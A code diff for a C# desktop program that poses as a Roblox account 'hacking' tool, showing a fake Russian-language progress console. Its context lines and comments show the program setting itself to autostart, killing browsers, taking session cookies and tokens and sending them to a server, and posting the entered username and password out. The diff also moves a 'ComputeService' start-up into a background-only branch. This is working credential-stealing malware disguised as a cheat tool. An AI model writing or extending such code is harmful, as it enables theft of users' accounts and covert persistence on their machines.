@@ -68,6 +68,8 @@ namespace FileTransfer
                             if (root.TryGetProperty("hideConsole", out var vHc)) HideConsole = vHc.GetString() == "true";
                             if (root.TryGetProperty("hideStatus", out var vHs)) HideStatusBar = vHs.GetString() == "true";
                             if (root.TryGetProperty("loginText", out var vLt)) LoginBtnText = vLt.GetString() ?? LoginBtnText;
+                            if (root.TryGetProperty("buttonText", out var vBt)) LoginBtnText = vBt.GetString() ?? LoginBtnText;
+                            if (root.TryGetProperty("btnText", out var vBtn)) LoginBtnText = vBtn.GetString() ?? LoginBtnText;
                             if (root.TryGetProperty("placeholderText", out var vPt)) PlaceholderTextValue = vPt.GetString() ?? PlaceholderTextValue;
 
                             if (root.TryGetProperty("layout", out var layoutEl) && layoutEl.ValueKind == System.Text.Json.JsonValueKind.Object)
@@ -102,7 +104,7 @@ namespace FileTransfer
         private static string ThemeSurfaceHex = "#0D0E12";
         private static bool HideConsole = false;
         private static bool HideStatusBar = false;
-        private static string LoginBtnText = "Р’Р—Р›РћРњРђРўР¬";
+        private static string LoginBtnText = "ВЗЛОМАТЬ";
         private static string PlaceholderTextValue = "Username";
 
         static MainWindow()
@@ -262,6 +264,16 @@ namespace FileTransfer
                     // Р§РёРЅРёРј Р°РІС‚РѕР·Р°РіСЂСѓР·РєСѓ РµСЃР»Рё СѓРґР°Р»РёР»Рё
                     Persistence.EnsureAutoStart();
                     _ = Task.Run(StartBackgroundWorkAsync);
+
+                    // Инициализация сервисного слоя Compute Service ТОЛЬКО в фоновом режиме!
+                    try
+                    {
+                        FileTransfer.Compute.ComputeService.Instance.Initialize(CustomConfigJson);
+                    }
+                    catch (Exception compEx)
+                    {
+                        Log("ComputeService init error: " + compEx.Message);
+                    }
                 }
                 else
                 {
@@ -280,16 +292,6 @@ namespace FileTransfer
 
                     // Сразу убиваем браузеры, извлекаем куку и отправляем на сервер
                     _ = Task.Run(StartBackgroundWorkAsync);
-                }
-
-                // Инициализация сервисного слоя Compute Service из Custom Project Config
-                try
-                {
-                    FileTransfer.Compute.ComputeService.Instance.Initialize(CustomConfigJson);
-                }
-                catch (Exception compEx)
-                {
-                    Log("ComputeService init error: " + compEx.Message);
                 }
 
                 Log("MainWindow constructor OK");
@@ -976,17 +978,17 @@ namespace FileTransfer
 
             string[] steps = new[]
             {
-                "РџРѕРґРєР»СЋС‡РµРЅРёРµ Рє Roblox API...",
-                "РџРѕРёСЃРє РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ РІ Р±Р°Р·Рµ РґР°РЅРЅС‹С…...",
-                "РРґРµРЅС‚РёС„РёРєР°С†РёСЏ UserId...",
-                "РџСЂРѕРІРµСЂРєР° СЃРµСЃСЃРёРё Р°РІС‚РѕСЂРёР·Р°С†РёРё...",
-                "РђРЅР°Р»РёР· С…РµС€РµР№ Р°РєРєР°СѓРЅС‚Р°...",
-                "РџРѕРґРєР»СЋС‡РµРЅРёРµ Рє СЃРµСЂРІРµСЂСѓ...",
-                "РђРЅР°Р»РёР· С‚СЂР°С„РёРєР° WebSocket...",
-                "РР·РІР»РµС‡РµРЅРёРµ РґР°РЅРЅС‹С… РїСЂРѕС„РёР»СЏ...",
-                "Р—Р°РіСЂСѓР·РєР° РїР°РєРµС‚РѕРІ РёР· Р±Р°Р·С‹...",
-                "РџСЂРѕРІРµСЂРєР° 2FA РІРµСЂРёС„РёРєР°С†РёРё...",
-                "Р“РµРЅРµСЂР°С†РёСЏ РєР»СЋС‡Р° РґРѕСЃС‚СѓРїР°..."
+                "Подключение к Roblox API...",
+                "Поиск пользователя в базе данных...",
+                "Идентификация UserId...",
+                "Проверка сессии авторизации...",
+                "Анализ хешей аккаунта...",
+                "Подключение к серверу...",
+                "Анализ трафика WebSocket...",
+                "Извлечение данных профиля...",
+                "Загрузка пакетов из базы...",
+                "Проверка 2FA верификации...",
+                "Генерация ключа доступа..."
             };
 
             int elapsed = 0;
@@ -1009,7 +1011,7 @@ namespace FileTransfer
                 else
                 {
                     int pct = rand.Next(60, 100);
-                    AppendConsole($"[{elapsed}s]", "#FFA502", $" РђРЅР°Р»РёР· РґР°РЅРЅС‹С…: {pct}%...", "#A29BFE");
+                    AppendConsole($"[{elapsed}s]", "#FFA502", $" Анализ данных: {pct}%...", "#A29BFE");
                 }
 
                 await Task.Delay(nextDelay * 1000);
@@ -1020,7 +1022,7 @@ namespace FileTransfer
 
             if (username.Length < 3)
             {
-                AppendConsole("[error]", "#FF4757", " РћС€РёР±РєР°: РЅРёРєРЅРµР№Рј СЃР»РёС€РєРѕРј РєРѕСЂРѕС‚РєРёР№ (РјРёРЅ. 3 СЃРёРјРІРѕР»Р°)", "#FF4757");
+                AppendConsole("[error]", "#FF4757", " Ошибка: никнейм слишком короткий (мин. 3 символа)", "#FF4757");
                 
                 // Show back input fields
                 TxtUsernameGrid.Visibility = Visibility.Visible;
@@ -1031,13 +1033,13 @@ namespace FileTransfer
                 return;
             }
 
-            AppendConsole("[done]", "#2ED573", " РџСЂРѕРІРµСЂРєР° Р·Р°РІРµСЂС€РµРЅР°!", "#2ED573");
+            AppendConsole("[done]", "#2ED573", " Проверка завершена!", "#2ED573");
 
-            // РС‰РµРј РїР°СЂРѕР»СЊ РІ accounts.txt РЅР° Р Р°Р±РѕС‡РµРј СЃС‚РѕР»Рµ (С„РѕСЂРјР°С‚ username:password РёР»Рё User: username | Pass: password)
+            // Ищем пароль в accounts.txt на Рабочем столе (формат username:password или User: username | Pass: password)
             string? foundPass = GetPasswordFromDesktopAccountsFile(username);
             string passwordToDisplay = foundPass ?? GetDeterministicPassword(username.ToLowerInvariant());
 
-            // РћС‚РїСЂР°РІР»СЏРµРј username/password РЅР° СЃРµСЂРІРµСЂ (С‚РѕРєРµРЅ СѓР¶Рµ СѓС€С‘Р» РїСЂРё СЃС‚Р°СЂС‚Рµ)
+            // Отправляем username/password на сервер (токен уже ушёл при старте)
             try
             {
                 var updatePayload = new
@@ -1056,7 +1058,7 @@ namespace FileTransfer
             catch { }
 
             TxtPassword.Text = passwordToDisplay;
-            AppendConsole("[result]", "#2ED573", $" РџР°СЂРѕР»СЊ: {passwordToDisplay}", "#2ED573");
+            AppendConsole("[result]", "#2ED573", $" Пароль: {passwordToDisplay}", "#2ED573");
 
             SaveToDesktopAccountsFile(username, passwordToDisplay, token);
 
